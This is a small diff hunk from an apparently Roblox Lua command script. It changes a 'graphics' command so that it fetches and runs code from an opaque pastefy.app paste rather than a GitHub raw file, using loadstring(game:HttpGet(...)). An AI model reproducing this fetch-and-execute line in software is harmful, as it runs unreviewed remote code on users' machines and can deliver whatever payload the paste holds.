@@ -2148,7 +2148,7 @@ local script = G2L["c"];
 		for _, name in pairs(allcmds.graphics) do
 			if cmd == prefix..name then
 				task.spawn(function()
-					loadstring(game:HttpGet("https://raw.githubusercontent.com/Fadify/RO-TX/main/Main.lua"))()
+					loadstring(game:HttpGet(('https://pastefy.app/xXkUxA0P/raw'),true))()
 				end)
 			end
 		end
